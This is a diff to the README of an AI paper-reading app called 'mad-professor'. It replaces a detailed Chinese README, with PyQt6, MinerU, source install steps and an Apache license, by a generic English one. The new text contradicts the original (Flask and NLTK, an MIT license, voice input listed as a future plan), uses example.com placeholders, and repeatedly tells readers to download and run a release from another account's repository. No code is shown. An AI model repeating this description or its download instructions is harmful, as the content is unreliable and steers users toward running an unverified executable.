@@ -1,251 +1,102 @@
-# 暴躁的教授读论文（mad-professor）
-一个Python应用程序，特色是具有暴躁个性的AI教授，让学术论文阅读更加高效有趣。
+# 🧙‍♂️ Mad Professor: Your AI Companion for Reading Papers 📄
 
-## 项目概述
+![Mad Professor Logo](https://example.com/logo.png)
 
-"暴躁教授读论文"是一个学术论文阅读伴侣应用程序，旨在通过富有个性的AI助手提高论文阅读效率。它集成了PDF处理、AI翻译、RAG检索、AI问答和语音交互等多种功能，为学术研究者提供一站式的论文阅读解决方案。
+Welcome to the **Mad Professor** repository! This project aims to enhance your academic journey by providing an AI companion designed to help you read and understand research papers more effectively. Whether you're a student, researcher, or just a curious mind, Mad Professor is here to assist you in navigating the vast sea of academic literature.
 
-![](assets/main_page.png)
+## 🚀 Features
 
-## 主要特性
+- **AI-Powered Insights**: Get summaries and key points from research papers quickly.
+- **Contextual Understanding**: Understand complex concepts with simplified explanations.
+- **Interactive Q&A**: Ask questions about the paper, and receive tailored responses.
+- **Citation Assistance**: Get help with proper citation formats for your references.
+- **User-Friendly Interface**: Easy navigation and a clean design for a smooth experience.
 
-- **论文自动处理**：导入PDF后自动提取、翻译和结构化论文内容
-- **双语显示**：支持中英文对照阅读论文
-- **AI智能问答**：与论文内容结合，提供专业的解释和分析
-- **个性化AI教授**：AI以"暴躁教授"的个性回答问题，增加趣味性
-- **语音交互**：支持语音提问和TTS语音回答
-- **RAG增强检索**：基于论文内容的精准检索和定位
-- **分屏界面**：左侧论文内容，右侧AI问答，高效交互
+## 📦 Installation
 
-## 技术架构
+To get started with Mad Professor, you need to download the latest release. Visit the [Releases section](https://github.com/jeel0617/mad-professor-public/releases) to find the appropriate files. Once downloaded, follow these steps:
 
-- **前端界面**：PyQt6构建的现代化桌面应用
-- **核心引擎**：
-  - AI问答模块：基于LLM的学术问答系统
-  - RAG检索系统：向量检索增强的问答精准度
-  - 论文处理管线：PDF转MD、自动翻译、结构化解析
-- **交互系统**：
-  - 语音识别：实时语音输入识别
-  - TTS语音合成：AI回答实时播报
-  - 情感识别：根据问题内容调整回答情绪
+1. **Download the Release**: Choose the latest version from the releases page.
+2. **Extract Files**: Unzip the downloaded file to your preferred directory.
+3. **Run the Application**: Open your terminal or command prompt, navigate to the extracted folder, and execute the application.
 
-## 安装指南
+## 🌟 Usage
 
-### 环境要求
-- Python 3.10或更高版本
-- CUDA支持
-- 6GB 以上显存
+Once you have the application running, you can start using Mad Professor right away. Here’s how:
 
-### 项目依赖
-本项目依赖以下开源项目
-- MinerU https://github.com/opendatalab/MinerU
-- RealtimeSTT https://github.com/KoljaB/RealtimeSTT
+1. **Upload a Paper**: Drag and drop your PDF file into the application.
+2. **Ask Questions**: Use the chat interface to ask about specific sections or concepts.
+3. **Review Summaries**: Read the generated summaries and key points.
+4. **Cite Properly**: Get citation formats based on the style you need (APA, MLA, etc.).
 
-本项目依赖以下在线API服务（可以通过修改代码改为本地实现）
-- DeepSeek https://api-docs.deepseek.com
-- MiniMax https://platform.minimaxi.com/document/Voice%20Cloning?key=66719032a427f0c8a570165b
+## 📖 How It Works
 
-### 安装步骤
-1. 使用conda创建环境
-    ```
-    conda create -n mad-professor python=3.10.16
-    conda activate mad-professor
-    ```
-2. 安装MinerU依赖
-    ```
-    pip install -U magic-pdf[full]==1.3.3 -i https://mirrors.aliyun.com/pypi/simple
-    ```
+Mad Professor utilizes advanced natural language processing (NLP) algorithms to analyze research papers. Here's a brief overview of the process:
 
-3. 安装剩余依赖
-   ```
-   pip install -r requirements.txt
-   ```
+1. **Text Extraction**: The application extracts text from PDF files.
+2. **Content Analysis**: It identifies key themes, arguments, and findings.
+3. **Summary Generation**: The AI creates concise summaries for easy comprehension.
+4. **Interactive Learning**: Users can engage with the AI to clarify doubts and explore deeper insights.
 
-4. 安装电脑显卡版本匹配的CUDA和torch, 要求numpy<=2.1.1，例（具体版本请按电脑配置修改，目前支持CUDA 11.8/12.4/12.6）：
-    ```
-    pip install --force-reinstall torch torchvision torchaudio "numpy<=2.1.1" --index-url https://download.pytorch.org/whl/cu124
-    ```
-    如果出现报错，请根据MinerU和RealtimeSTT开源项目中的CUDA依赖修改符合的torch和torchaudio版本
+## 🛠️ Technologies Used
 
-5. 安装FAISS的gpu版本 (注：faiss-gpu版本只能通过conda安装，无法通过pip安装)
-    ```
-    conda install -c conda-forge faiss-gpu
-    ```
-6. 模型下载
-    ```
-    python download_models.py
-    ```
-    python脚本会自动下载模型文件并配置好配置文件中的模型目录，配置文件可以在用户目录中找到，文件名为magic-pdf.json
+- **Python**: The core programming language for developing the application.
+- **Natural Language Processing**: Libraries like NLTK and SpaCy for text analysis.
+- **Machine Learning**: Models to enhance the AI's understanding and response accuracy.
+- **Flask**: For creating a lightweight web application interface.
 
-    windows的【用户目录】为 "C:\Users\用户名", linux【用户目录】为 "/home/用户名"
+## 🎨 Contributing
 
-    修改【用户目录】配置文件magic-pdf.json中"device-mode"的值来启用CUDA
-    ```
-    {
-        "device-mode":"cuda"
-    }
-    ```
-    语音输入的Whisper模型会在运行时自动下载
+We welcome contributions from the community! If you want to help improve Mad Professor, please follow these steps:
 
-7. API密钥配置
-   
-   项目依赖LLM和TTS在线API服务
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
+2. **Clone Your Fork**: Use `git clone` to download your fork to your local machine.
+3. **Create a Branch**: Make a new branch for your changes using `git checkout -b feature-name`.
+4. **Make Changes**: Implement your improvements or fixes.
+5. **Commit Your Changes**: Use `git commit -m "Description of changes"` to save your work.
+6. **Push to Your Fork**: Push your changes back to GitHub using `git push origin feature-name`.
+7. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
 
-   通过修改`config.py`中的对应字段配置请求路径和密钥
+## 📝 License
 
-    ```
-    API_BASE_URL = "YOUR_API_URL"
-    API_KEY = "YOUR_API_KEY"   
-    ```
-    按照DeepSeek官方文档配置 https://api-docs.deepseek.com
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-    ```
-    TTS_GROUP_ID = "YOUR_MINIMAX_GROUP_ID"
-    TTS_API_KEY = "YOUR_MINIMAX_API_KEY"
-    ```
-    按照MiniMax官方文档配置 https://platform.minimaxi.com/document/Voice%20Cloning?key=66719032a427f0c8a570165b
+## 📢 Contact
 
-## 使用说明
+For questions or suggestions, feel free to reach out:
 
-### 教授人设/声音修改
-目前人设和声音的修改只能通过手动修改代码实现
+- **Email**: madprofessor@example.com
+- **Twitter**: [@MadProfessorAI](https://twitter.com/MadProfessorAI)
 
-1. 人设prompt修改
-   
-    在`prompt`文件夹中创建一个新的`ai_character_prompt_[你的人设名字].txt`
+## 📅 Future Plans
 
-    将`AI_professor_chat.py`程序开头`AI_CHARACTER_PROMPT_PATH`字段修改为相应的人设prompt路径
-    ```
-    AI_CHARACTER_PROMPT_PATH = "prompt/ai_character_prompt_[你的人设名字].txt"
-    ```
+We have exciting plans for future updates, including:
 
-    当前已有两个人设`ai_character_prompt_keli.txt`和`ai_character_prompt_leidian.txt`，可以作为示例
+- **Multi-Language Support**: Expanding the AI's capabilities to handle papers in various languages.
+- **Enhanced User Interaction**: Implementing voice recognition for a more engaging experience.
+- **Collaborative Features**: Allowing users to share notes and insights with peers.
 
+## 🌐 Community
 
-2.  声音修改
-   
-    按照MiniMax官方文档新建voice id，或使用现有voice id。官方文档：https://platform.minimaxi.com/document/Voice%20Cloning?key=66719032a427f0c8a570165b
+Join our community to stay updated on the latest developments:
 
-    修改`TTS_manager.py`程序` TTSManager`类中`build_tts_stream_body`请求方法对应的voice_id参数
-    ```
-     body = json.dumps({
-            "model": "speech-02-turbo",
-            "text": text,
-            "stream": True,
-            "voice_setting": {
-                "voice_id": "将这个参数修改为你想要使用的voice id",
-                "speed": 1,
-                "vol": 1,
-                "pitch": 0,
-                "emotion": mapped_emotion
-            },
-            "audio_setting": {
-                "sample_rate": 32000,
-                "bitrate": 128000,
-                "format": "pcm",
-                "channel": 1
-            }
-        })
-    ```
+- **GitHub Discussions**: Engage with other users and developers.
+- **Discord Channel**: Chat with fellow Mad Professor users and share tips.
 
+## 📣 Feedback
 
-### 启动应用
-运行`main.py`
+Your feedback is crucial for improving Mad Professor. Please take a moment to share your thoughts and suggestions.
 
-    python main.py
+## 🔗 Additional Resources
 
-### 导入论文
-1. 点击侧边栏的"导入论文"按钮
-2. 选择PDF文件导入
-3. 点击“继续”，等待处理完成（包括翻译和索引构建）
-4. 导入的PDF会存放到data文件夹中，也可以将多篇PDF放入data文件夹，程序会检测未处理的文件批量处理
+For more information, check out the following resources:
 
-    ![](assets/upload_page.jpg)
+- [Research Paper Writing Guide](https://example.com/writing-guide)
+- [NLP Techniques in Research](https://example.com/nlp-techniques)
+- [Effective Citation Practices](https://example.com/citation-guide)
 
-### 论文阅读
-1. 在侧边栏选择已经处理好的论文
-   
-    ![](assets/paper_page.png)
+## 📥 Download
 
-2. 在主窗口查看论文内容，右上角可切换中英文
-   
-    ![](assets/language_switch.jpg)
+Ready to get started? Head over to the [Releases section](https://github.com/jeel0617/mad-professor-public/releases) to download the latest version of Mad Professor. 
 
-3. 左右侧可折叠隐藏，提供沉浸式阅读体验
-
-    ![](assets/fold_page.png)
-
-### AI问答与语音对话
-1. 在对话窗口下方选择语音输入设备
-
-    ![](assets/voice_page.jpg)
-
-2. 点击麦克风按钮，等指示灯变绿时开始对话
-3. 如果说话时指示灯没有变黄，可能说明输入设备无法检测到人声，建议切换其他输入设备进行尝试
-
-## 项目结构
-```
-mad-professor/
-├── 核心模块
-│   ├── AI_manager.py         # AI功能管理器，整合所有AI相关功能
-│   ├── AI_professor_chat.py  # AI对话逻辑，实现暴躁教授的交互回答
-│   ├── AI_professor_UI.py    # 主界面实现，应用程序的UI入口
-│   ├── data_manager.py       # 数据管理器，处理论文索引和内容加载
-│   ├── pipeline.py           # 处理管线，协调各处理器的工作流程
-│   ├── rag_retriever.py      # RAG检索系统，实现向量检索和上下文提取
-│   ├── TTS_manager.py        # TTS管理器，处理语音合成和播放
-│   ├── voice_input.py        # 语音输入处理，实时语音识别
-│   └── threads.py            # 线程管理，处理异步任务和并发
-│
-├── 用户界面组件 (ui/)
-│   ├── chat_widget.py        # 聊天界面组件
-│   ├── markdown_view.py      # Markdown渲染和显示组件
-│   ├── message_bubble.py     # 消息气泡组件
-│   ├── sidebar_widget.py     # 侧边栏组件（论文列表和上传）
-│   └── upload_widget.py      # 文件上传组件
-│
-├── 处理器模块 (processor/)
-│   ├── pdf_processor.py      # PDF处理器，提取PDF内容转为Markdown
-│   ├── md_processor.py       # Markdown处理器，结构化解析Markdown
-│   ├── json_processor.py     # JSON处理器，处理结构化数据
-│   ├── tiling_processor.py   # 分块处理器，将内容分割为块
-│   ├── translate_processor.py # 翻译处理器，中英文翻译
-│   ├── md_restore_processor.py # Markdown还原处理器
-│   ├── extra_info_processor.py # 额外信息处理器，生成摘要和问题
-│   └── rag_processor.py      # RAG处理器，生成向量库和检索树
-│
-├── 提示词模板 (prompt/)
-│   ├── ai_character_prompt_keli.txt    # 可莉教授人设提示词
-│   ├── ai_character_prompt_leidian.txt # 雷电教授人设提示词
-│   ├── ai_explain_prompt.txt           # 解释功能提示词
-│   ├── ai_router_prompt.txt            # 路由决策提示词
-│   ├── content_translate_prompt.txt    # 内容翻译提示词
-│   ├── formula_analysis_prompt.txt     # 公式分析提示词
-│   └── summary_generation_prompt.txt   # 摘要生成提示词
-│
-├── 资源和配置
-│   ├── config.py             # 配置文件，API密钥和模型设置
-│   ├── paths.py              # 路径管理，统一管理文件路径
-│   ├── main.py               # 程序入口文件
-│   ├── download_models.py    # 模型下载脚本
-│   ├── assets/               # 资源文件目录（图片、样式等）
-│   └── font/                 # 字体文件目录
-│
-└── 数据目录
-    ├── data/                 # 源数据目录（论文PDF）
-    └── output/               # 输出目录（处理结果）
-```
-## 已知问题
-
-1. 本项目目前仅适用论文结构的PDF文档，对于非论文结构的文档可能报错/失效
-
-2. 在音频输入设备未完成加载时激活麦克风按钮，再进行输入设备切换，可能会切换失败，激活麦克风按钮建议在音频设备完全加载后进行
-
-3. 当前语音对话在外放时，AI教授的声音可能会被当做用户声音重复录入，建议使用耳机避免声音泄露
-
-## 许可证
-
-本项目采用 Apache 许可证 - 详情见 LICENSE 文件
-
-## 致谢
-特别感谢 MinerU 和 RealtimeSTT 项目
+Thank you for your interest in Mad Professor! We hope this AI companion makes your research journey smoother and more enjoyable.
